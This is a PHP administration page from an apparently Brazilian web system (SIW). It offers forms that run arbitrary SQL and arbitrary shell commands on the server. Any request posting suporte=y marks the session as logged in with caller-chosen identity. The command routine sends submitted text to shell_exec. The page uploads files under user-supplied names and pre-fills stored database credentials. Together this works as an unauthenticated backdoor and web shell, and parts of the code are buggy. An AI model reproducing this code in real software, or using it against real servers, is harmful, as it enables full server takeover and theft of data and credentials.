<?php
session_start();
$w_dir_volta    = '../';
include_once($w_dir_volta.'constants.inc');
include_once($w_dir_volta.'jscript.php');
include_once($w_dir_volta.'funcoes.php');
include_once($w_dir_volta.'classes/db/abreSessao.php');
include_once($w_dir_volta.'classes/sp/db_getMenuData.php');
include_once($w_dir_volta.'classes/sp/db_getMenuCode.php');
include_once($w_dir_volta.'classes/sp/db_getLinkData.php');
include_once($w_dir_volta.'classes/sp/db_getLinkSubMenu.php');
include_once($w_dir_volta.'classes/sp/db_getCustomerData.php');
include_once($w_dir_volta.'classes/sp/db_getCustomerSite.php');
include_once($w_dir_volta.'classes/sp/db_exec.php');

// =========================================================================
//  /exec.php
// ------------------------------------------------------------------------
// Nome     : Alexandre Vinhadelli Papadópolis
// Descricao: Executa funções de segurança
// Mail     : alex@sbpi.com.br
// Criacao  : 17/11/2006 12:25
// Versao   : 1.0.0.0
// Local    : Brasília - DF
// -------------------------------------------------------------------------
// 
// Parâmetros recebidos:
//    R (referência) = usado na rotina de gravação, com conteúdo igual ao parâmetro T
//    O (operação)   = I   : Inclusão
//                   = A   : Alteração
//                   = E   : Exclusão
//                   = L   : Listagem
//                   = C   : Conclusão
//                   = P   : Pesquisa


if ($_POST['suporte']=='y') {
  $_SESSION['LOGON'] = 'Sim';
  $_SESSION['DBMS'] = $_POST['p_dbms'];
  $_SESSION['P_CLIENTE'] = $_POST['p_cliente'];
  $_SESSION['SQ_PESSOA'] = $_POST['sq_pessoa'];
}

//Inicializa objeto de conexão e executa a query
if (nvl($_REQUEST['dataBank'],'')!='') {
  $conObj = new abreSessao; $conObj = $conObj->getInstanceOf($_REQUEST['dataBank']);
}

// Carrega variáveis locais com os dados dos parâmetros recebidos
$par        = upper($_REQUEST['par']);
$P1         = nvl($_REQUEST['P1'],0);
$P2         = nvl($_REQUEST['P2'],0);
$P3         = nvl($_REQUEST['P3'],1);
$P4         = nvl($_REQUEST['P4'],$conPageSize);
$TP         = $_REQUEST['TP'];
$SG         = upper($_REQUEST['SG']);
$R          = $_REQUEST['R'];
$O          = upper($_REQUEST['O']);

$w_assinatura   = upper($_REQUEST['w_assinatura']);
$w_pagina       = 'exec.php?par=';
$w_Disabled     = 'ENABLED';
$w_dir          = 'mod_dc/';
$w_troca        = $_REQUEST['w_troca'];

// Verifica se o usuário está autenticado
if ($_SESSION['LOGON']!='Sim') EncerraSessao();

// Declaração de variáveis
$dbms = new abreSessao; $dbms = $dbms->getInstanceOf($_SESSION['DBMS']);

// Se for acompanhamento, entra na filtragem  
if (nvl($O,'')=='') {
  if ($P1==3) $O = 'P'; else $O = 'L';
}

// Se receber o código do cliente do SIW, o cliente será determinado por parâmetro;
// caso contrário, o cliente será a empresa ao qual o usuário logado está vinculado.
$w_cliente  = RetornaCliente();
$w_usuario  = RetornaUsuario();
$w_menu     = RetornaMenu($w_cliente,$SG);

// Verifica se o documento tem sub-menu. Se tiver, agrega no HREF uma chamada para montagem do mesmo.
$sql = new db_getLinkSubMenu; $RS = $sql->getInstanceOf($dbms,$_SESSION['P_CLIENTE'],$SG);
if (count($RS)>0) {
  $w_submenu = 'Existe';
} else {
  $w_submenu = '';
} 

// Recupera a configuração do serviço
if ($P2>0) {
  $sql = new db_getMenuData; $RS_Menu = $sql->getInstanceOf($dbms,$P2);
} else {
  $sql = new db_getMenuData; $RS_Menu = $sql->getInstanceOf($dbms,$w_menu);
}

// Se for sub-menu, pega a configuração do pai
if (f($RS_Menu,'ultimo_nivel')=='S') { 
  $sql = new db_getMenuData; $RS_Menu = $sql->getInstanceOf($dbms,f($RS_Menu,'sq_menu_pai'));
} 

Main();

FechaSessao($dbms);

exit;

// =========================================================================
// Monta frame para execução de sql
// -------------------------------------------------------------------------
function ExecSql() {
  extract($GLOBALS);

  ShowHTML('<HTML>');
  ShowHTML('<FRAMESET ROWS="200,*" FRAMEBORDER="yes" BORDER=1 framespacing=1>');
  ShowHTML('    <FRAME NAME="null"');
  ShowHTML('      SRC="'.$w_pagina.'inputSql&P1='.$P1.'&P2='.$P2.'&P3='.$P3.'&P4='.$P4.'&TP='.$TP.'&SG='.$SG.'"');
  ShowHTML('      MARGINWIDTH=0');
  ShowHTML('      MARGINHEIGHT=0');
  ShowHTML('      SCROLLING=no');
  ShowHTML('      BORDERCOLOR="#000000"');
  ShowHTML('      target="content">');
  ShowHTML('    <FRAME NAME="result"');
  ShowHTML('      SRC="'.$w_pagina.'resultSql&P1='.$P1.'&P2='.$P2.'&P3='.$P3.'&P4='.$P4.'&TP='.$TP.'&SG='.$SG.'"');
  ShowHTML('      MARGINWIDTH=0');
  ShowHTML('      MARGINHEIGHT=0');
  ShowHTML('      SCROLLING=auto');
  ShowHTML('      BORDERCOLOR="#000000">');
  ShowHTML('</FRAMESET>');
  ShowHTML('</HTML>');
} 

// =========================================================================
// Formulário para inserção do SQL
// -------------------------------------------------------------------------
function InputSql() {
  extract($GLOBALS);
  $dataBank     = nvl($_POST['dataBank'],4);
  $dataBank_ant = $_POST['dataBank_ant'];
  $serverName   = $_POST['serverName'];
  $userName     = $_POST['userName'];
  $password     = $_POST['password'];
  $sqlStr       = $_POST['sqlStr'];
  $databaseName = DATABASE_NAME;
  if ($dataBank!=nvl($dataBank_ant,0)) {
    switch ($dataBank) {
      case 1: $serverName   = ORA9_SERVER_NAME;
              $userName     = ORA9_DB_USERID;
              $password     = ORA9_DB_PASSWORD;
              break;
      case 3: $serverName   = ORA8_SERVER_NAME;
              $userName     = ORA8_DB_USERID;
              $password     = ORA8_DB_PASSWORD;
              break;
      case 2: $serverName   = MSSQL_SERVER_NAME;
              $userName     = MSSQL_DB_USERID;
              $password     = MSSQL_DB_PASSWORD;
              break;
      case 4: $serverName   = PGSQL_SERVER_NAME;
              $userName     = PGSQL_DB_USERID;
              $password     = PGSQL_DB_PASSWORD;
              break;
    }
  }
  ShowHTML('<html>');
  head();
  ScriptOpen('JavaScript');
  ValidateOpen('Validacao');
  Validate('serverName','Servidor','','',1,100,'1','1');
  Validate('databaseName','Database','',1,1,100,'1','1');
  Validate('userName','Usuário','',1,1,100,'1','1');
  Validate('password','Senha','',1,1,100,'1','1');
  Validate('sqlStr','SQL','',1,1,64536,'1','1');
  ShowHTML('  theForm.sqlStr.focus();');
  ValidateClose();
  ScriptClose();
  ShowHTML('</HEAD>');
  ShowHTML('<BASE HREF="'.$conRootSIW.'">');
  ShowHTML('<BASEFONT FACE="Arial, Helvetica, Sans-Serif">');
  BodyOpen('onload="document.Form.sqlStr.focus();"');
  ShowHTML('<B><FONT COLOR="#000000">'.$TP.'</FONT></B>');
  ShowHTML('<HR>');
  ShowHTML('<div align=center><center>');
  ShowHTML('<table border="0" cellpadding="0" cellspacing="0" width="100%">');
  ShowHTML('<tr bgcolor="'.$conTrBgColor.'"><td align="center">');
  AbreForm('Form',$w_dir.$w_pagina.'resultSql','POST','return(Validacao(this));','result',$P1,$P2,1,$P4,$TP,$SG,$R,$O);
  ShowHTML('    <input type="hidden" name="dataBank_ant" value="'.$dataBank.'">');
  ShowHTML('    <table width="100%">');
  ShowHTML('    <tr><td valign="top"><table>');
  ShowHTML('    <tr>');
  ShowHTML('      <td align="right">RDBMS</td>');
  ShowHTML('      <td><select name="dataBank" CLASS="sts" onchange="document.Form.target=\'\'; document.Form.action=\''.$w_dir.$w_pagina.$par.'\'; document.Form.submit();">');
  if ($dataBank==2) ShowHTML('          <option value="2" selected>MS-SQL Server');          else ShowHTML('          <option value="2">MS-SQL Server');
  if ($dataBank==1) ShowHTML('          <option value="1" selected>Oracle ANSI 92');         else ShowHTML('          <option value="1">Oracle ANSI 92');
  if ($dataBank==3) ShowHTML('          <option value="3" selected>Oracle 8 e anteriores');  else ShowHTML('          <option value="3">Oracle 8 e anteriores');
  if ($dataBank==4) ShowHTML('          <option value="4" selected>PostgreSQL');             else ShowHTML('          <option value="4">PostgreSQL');
  ShowHTML('          </select>');
  ShowHTML('    <tr>');
  ShowHTML('      <td align="right">Servidor</td>');
  ShowHTML('      <td><input type=text name="serverName" CLASS="sti" value="'.$serverName.'"></td>');
  ShowHTML('    <tr>');
  ShowHTML('      <td align="right">Database</td>');
  ShowHTML('      <td><input type=text name="databaseName" CLASS="sti" value="'.$databaseName.'"></td>');
  ShowHTML('    </tr>');
  ShowHTML('    <tr>');
  ShowHTML('      <td align="right">Usuário</td>');
  ShowHTML('      <td><input type=text name="userName" CLASS="sti" value="'.$userName.'"></td>');
  ShowHTML('    <tr>');
  ShowHTML('      <td align="right">Senha</td>');
  ShowHTML('      <td><input type=password name="password" CLASS="sti" value="'.$password.'"></td>');
  ShowHTML('    </tr>');
  ShowHTML('    <tr>');
  ShowHTML('      <td colspan=2 align="center" valign="center"><br><br><input type="submit" name="exec" value="exec" CLASS="stb"></td>');
  ShowHTML('    </tr>');
  ShowHTML('    </table><td rowspan="2"><table>');
  ShowHTML('    <tr>');
  ShowHTML('      <td align=center>');
  ShowHTML('        <input type="hidden" name="tivohidden" value="tivogold">');
  ShowHTML('        <textarea name="sqlStr" rows=9 cols=70 wrap="soft" CLASS="sti">'.$sqlStr.'</textarea>');
  ShowHTML('      </td>');
  ShowHTML('    </tr>');
  ShowHTML('    </table>');
  ShowHTML('    </table>');
  ShowHTML('  </form>');
  ShowHTML('</table>');
  ShowHTML('</body>');
  ShowHTML('</html>');
} 

// =========================================================================
// Rotina de visualização dos resultados do SQL informado
// -------------------------------------------------------------------------
function ResultSql() {
  extract($GLOBALS);
  $dataBank = $_POST['dataBank'];
  $svrName  = $_POST['serverName'];
  $dbName   = $_POST['databaseName'];
  $pswd     = $_POST['password'];
  $login    = $_POST['userName'];

  ShowHTML('<html>');
  ShowHTML('<BASE HREF="'.$conRootSIW.'">');
  ShowHTML('<link rel="stylesheet" type="text/css" href="http://www2.sbpi.com.br/siw/classes/menu/xPandMenu.css">');
  BodyOpen(null);
  ShowHTML('<table border="0" cellpadding="0" cellspacing="0" width="100%">');
  ShowHTML('<tr bgcolor="'.$conTrBgColor.'"><td>');
  if (nvl($_POST['sqlStr'],'')=='') {
    ShowHTML('<h4> Instrução SQL não informada </h4>');
  } else {
    //tira os brancos e substitui aspas duplas por aspas simples
    $mySql = str_replace('\\\'','\'',trim($_POST['sqlStr']));
    if (false!==strpos($mySql,';')) {
      $l_sql = explode(';',$mySql);
    } else {
      $l_sql[0] = $mySql;
    }

    //Inicializa variáveis
    $dispblank='&nbsp;';
    $dispnull='-null-';

    foreach($l_sql as $k => $v) {
      if (nvl($v,'')=='') continue;
      ShowHTML('<p><b>'.($k+1).'===>'.$v.'</b></p>');
    
      $command = upper(substr(trim($v),0,strpos(trim($v),' ')));
      if ($command=='SELECT') {
        $sql = new db_exec; $RS = $sql->getInstanceOf($conObj, $v, &$numRows, $dataBank);
        if (count($RS) > 0) {
           ShowHTML($numRows.' registros selecionados<br />');
           ShowHTML('<table border="1">');
           ShowHTML('<tr valign="top">');
           foreach ($RS as $row) {
              foreach ($row as $key => $val) ShowHTML('<td>'.lower($key).'&nbsp;</td>'); 
              break;
           }
           ShowHTML('</tr>');
     
           foreach($RS as $row) {
             ShowHTML('<tr valign="top">');
             foreach ($row as $key => $val) { 
               ShowHTML('<td>'.nvl($val,$dispnull).'</td>');
             }
             ShowHTML('</tr>');
           };
           ShowHTML('</table>');
        } else {
           ShowHTML('Nenhum registro encontrado<br />');
        }      
      } elseif (false!==strpos('INSERT,UPDATE,DELETE',$command)) {
        $sql = new db_exec; $RS = $sql->getInstanceOf($conObj, $v, &$numRows, $dataBank);
        ShowHTML('<p>'.$numRows.' registros processados</p>');
      } elseif ($command=='EXEC') {
        $sp = substr($v,strpos($v,' ')+1);
        if (strpos($stmt,':data')===false) {
          // Stored procedure sem cursor
          if ($dataBank=1 or $dataBank=3) {
            $stmt = oci_parse($conObj, "begin $sp; end;");
            if (oci_execute($stmt)) ShowHTML('<p> comando executado</p>');
          }
        } else {
          // Stored procedure com cursor
          if ($dataBank=1 or $dataBank=3) {
            $cursor = oci_new_cursor($conObj);
            $stmt   = oci_parse($conObj, "begin ".$sp."; end;");
            oci_bind_by_name($stmt, "data", $cursor, -1, OCI_B_CURSOR);
            oci_execute($stmt);
            oci_execute($cursor);
            $nrows  = oci_fetch_all($cursor, $results, 0, -1,OCI_ASSOC+OCI_FETCHSTATEMENT_BY_ROW);
          } elseif ($dataBank=4) {
            $par      = 'rollback; begin; select '.str_replace(':data','\'p_result\'',$sp).'; fetch all in p_result;';
            $results  = pg_query($conObj, $par);
            $nrows    = pg_num_rows($results); 
            $results  = pg_fetch_all($results);
          } else {
          }
          if ($nrows > 0) {
             ShowHTML($nrows.' registros selecionados<br />');
             ShowHTML('<table border="1">');
             ShowHTML('<tr valign="top">');
             foreach ($results as $sup => $reg) {
               foreach ($reg as $key => $val) {
                 ShowHTML('<td>'.lower($key).'</td>');
               }
               break;
             }
             ShowHTML('</tr>');
       
             foreach ($results as $data) {
                ShowHTML('<tr valign="top">');
                foreach ($data as $key => $val) {
                  ShowHTML('<td>'.nvl($val,$dispnull).'</td>');
                }  
                ShowHTML('</tr>');
             }
             ShowHTML('</table>');
          } else {
             ShowHTML('Nenhum registro encontrado<br />');
          }
        }
      } else {
        ShowHTML('<p> comando executado</p>');
      }
    }
    if (@oci_server_version($conObj)) {
      oci_close($conObj);
    } elseif (is_array(pg_version($conObj))) {
    } else {
    }
  }
  ShowHTML('</table>');
  ShowHTML('</body>');
  ShowHTML('</html>');
} 

// =========================================================================
// Monta frame para execuçao de comandos
// -------------------------------------------------------------------------
function ExecCom() {
  extract($GLOBALS);

  ShowHTML('<HTML>');
  ShowHTML('<FRAMESET ROWS="200,*" FRAMEBORDER="yes" BORDER=1 framespacing=1>');
  ShowHTML('    <FRAME NAME="null"');
  ShowHTML('      SRC="'.$w_pagina.'inputCom&P1='.$P1.'&P2='.$P2.'&P3='.$P3.'&P4='.$P4.'&TP='.$TP.'&SG='.$SG.'"');
  ShowHTML('      MARGINWIDTH=0');
  ShowHTML('      MARGINHEIGHT=0');
  ShowHTML('      SCROLLING=no');
  ShowHTML('      BORDERCOLOR="#000000"');
  ShowHTML('      target="content">');
  ShowHTML('    <FRAME NAME="result"');
  ShowHTML('      SRC="'.$w_pagina.'resultCom&P1='.$P1.'&P2='.$P2.'&P3='.$P3.'&P4='.$P4.'&TP='.$TP.'&SG='.$SG.'"');
  ShowHTML('      MARGINWIDTH=0');
  ShowHTML('      MARGINHEIGHT=0');
  ShowHTML('      SCROLLING=auto');
  ShowHTML('      BORDERCOLOR="#000000">');
  ShowHTML('</FRAMESET>');
  ShowHTML('</HTML>');
} 

// =========================================================================
// Formulário para inserção do SQL
// -------------------------------------------------------------------------
function InputCom() {
  extract($GLOBALS);

  ShowHTML('<html>');
  head();
  ScriptOpen('JavaScript');
  ValidateOpen('Validacao');
  Validate('sqlStr','Comando','',1,1,64536,'1','1');
  ShowHTML('  theForm.sqlStr.focus();');
  ValidateClose();
  ScriptClose();
  ShowHTML('</HEAD>');
  ShowHTML('<BASE HREF="'.$conRootSIW.'">');
  ShowHTML('<BASEFONT FACE="Arial, Helvetica, Sans-Serif">');
  BodyOpen('onload="document.Form.sqlStr.focus();"');
  ShowHTML('<B><FONT COLOR="#000000">'.$TP.'</FONT></B>');
  ShowHTML('<HR>');
  ShowHTML('<table border="0" cellpadding="0" cellspacing="0" width="100%">');
  ShowHTML('<tr bgcolor="'.$conTrBgColor.'"><td>');
  ShowHTML('<FORM action="'.$w_dir.$w_pagina.'resultCom&SG='.$SG.'&O='.$O.'" name="Form" onSubmit="return(Validacao(this));" enctype="multipart/form-data" method="POST" target="result">');
  ShowHTML('<INPUT type="hidden" name="P1" value="'.$P1.'">');
  ShowHTML('<INPUT type="hidden" name="P2" value="'.$P2.'">');
  ShowHTML('<INPUT type="hidden" name="P3" value="'.$P3.'">');
  ShowHTML('<INPUT type="hidden" name="P4" value="'.$P4.'">');
  ShowHTML('<INPUT type="hidden" name="TP" value="'.$TP.'">');
  ShowHTML('<INPUT type="hidden" name="R" value="'.$R.'">');
  ShowHTML('    <table>');
  ShowHTML('    <tr><td colspan=2><textarea name="sqlStr" rows=3 cols=70 wrap="soft" CLASS="sti"></textarea>');
  ShowHTML('    <tr valign="bottom">');
  ShowHTML('      <td><table>');
  ShowHTML('      <tr><td align="right">Arquivo 1</td><td><input type="file" name="arquivo[]" CLASS="sti"></td>');
  ShowHTML('          <td align="right">Arquivo 2</td><td><input type="file" name="arquivo[]" CLASS="sti"></td>');
  ShowHTML('      <tr><td align="right">Arquivo 3</td><td><input type="file" name="arquivo[]" CLASS="sti"></td>');
  ShowHTML('          <td align="right">Arquivo 4</td><td><input type="file" name="arquivo[]" CLASS="sti"></td>');
  ShowHTML('      <tr><td align="right">Arquivo 5</td><td><input type="file" name="arquivo[]" CLASS="sti"></td>');
  ShowHTML('          <td align="right">Arquivo 6</td><td><input type="file" name="arquivo[]" CLASS="sti"></td>');
  ShowHTML('      </table>');
  ShowHTML('      <td><input type="submit" name="exec" value="exec" CLASS="stb"></td>');
  ShowHTML('    </table>');
  ShowHTML('  </form>');
  ShowHTML('</table>');
  ShowHTML('</body>');
  ShowHTML('</html>');
} 

// =========================================================================
// Rotina de visualização dos resultados do SQL informado
// -------------------------------------------------------------------------
function ResultCom() {
  extract($GLOBALS);

  // Verifica a necessidade de criação dos diretórios do cliente
  if (!(file_exists(DiretorioCliente($w_cliente).'/'.tmp))) mkdir(DiretorioCliente($w_cliente).'/tmp');

  // Carrega os arquivos do upload
  foreach ($_FILES as $Chv => $File) {
    for ($i=0; $i<count($File); $i++) {
      if (!$File['error'][$i]) move_uploaded_file($File['tmp_name'][$i],DiretorioCliente($w_cliente).'/tmp/'.$File['name'][$i]);
    }
  } 

  ShowHTML('<html>');
  ShowHTML('<BASE HREF="'.$conRootSIW.'">');
  ShowHTML('<link rel="stylesheet" type="text/css" href="http://www2.sbpi.com.br/siw/classes/menu/xPandMenu.css">');
  BodyOpen(null);
  ShowHTML('<table border="0" cellpadding="0" cellspacing="0" width="100%">');
  ShowHTML('<tr bgcolor="'.$conTrBgColor.'"><td>');
  if (nvl($_POST['sqlStr'],'')=='') {
    ShowHTML('<h4> Comando não informado </h4>');
  } else {
    //tira os brancos e substitui aspas duplas por aspas simples
    $mySql = str_replace('\\\'','\'',trim($_POST['sqlStr']));
    if (false!==strpos($mySql,';')) {
      $l_sql = explode(';',$mySql);
    } else {
      $l_sql[0] = $mySql;
    }

    //Inicializa variáveis
    $dispblank='&nbsp;';
    $dispnull='-null-';

    foreach($l_sql as $k => $v) {
      if (nvl($v,'')=='') continue;
      ShowHTML('<p><b>'.($k+1).'===>'.$v.'</b></p>');
    
      $comando = $v;
      $result = shell_exec($comando);
      if(!$result) {
        echo("Não é possível determinar se o comando foi executado com erros ou não foi executado!");
      } else {
        ShowHTML('<table border="1" bgcolor="#7FFFD4"><tr><td>');
        echo('<pre>'.$result.'</pre>');
        ShowHTML('</table>');
      }
    }
  }
  ShowHTML('</table>');
  ShowHTML('</body>');
  ShowHTML('</html>');
} 

// =========================================================================
// Rotina principal
// -------------------------------------------------------------------------
function Main() {
  extract($GLOBALS);
  switch ($par) {
  case 'SQL':           ExecSql();        break;
  case 'INPUTSQL':      InputSql();       break;
  case 'RESULTSQL':     ResultSql();      break;
  case 'COMANDO':       ExecCom();        break;
  case 'INPUTCOM':      InputCom();       break;
  case 'RESULTCOM':     ResultCom();      break;
  case 'GRAVA':         Grava();          break;
  default:
    Cabecalho();
    ShowHTML('<BASE HREF="'.$conRootSIW.'">');
    BodyOpen('onLoad=this.focus();');
    Estrutura_Topo_Limpo();
    Estrutura_Menu();
    Estrutura_Corpo_Abre();
    Estrutura_Texto_Abre();
    ShowHTML('<div align=center><center><br><br><br><br><br><br><br><br><br><br><img src="images/icone/underc.gif" align="center"> <b>Esta opção está sendo desenvolvida.</b><br><br><br><br><br><br><br><br><br><br></center></div>');
    Estrutura_Texto_Fecha();
    Estrutura_Fecha();
    Estrutura_Fecha();
    Estrutura_Fecha();
    Rodape();
  } 
} 
?>


